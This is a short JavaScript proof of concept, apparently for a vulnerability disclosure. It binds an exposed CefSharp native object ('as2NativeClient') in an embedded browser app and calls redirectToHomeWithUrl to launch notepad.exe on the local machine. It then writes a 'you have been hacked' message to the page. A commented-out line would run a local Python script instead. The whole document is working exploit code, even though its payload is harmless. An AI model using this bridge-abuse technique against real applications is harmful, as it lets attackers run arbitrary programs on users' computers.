


        window.CefSharp.BindObjectAsync("as2NativeClient")
        .then((result) => {
          if(window.as2NativeClient) {
            console.log("NC Object bound");
                  
            
            window.as2NativeClient.redirectToHomeWithUrl("C:\\Windows\\System32\\notepad.exe");
             
            document.write("<font color=red size=20><br><br>Did Notepad appeared out of nowhere? <br>Looks like you have been hacked!")

           // window.as2NativeClient.redirectToHomeWithUrl("C:\\Users\\rakesh\\Desktop\\1.py");
                  
          }
        })
      











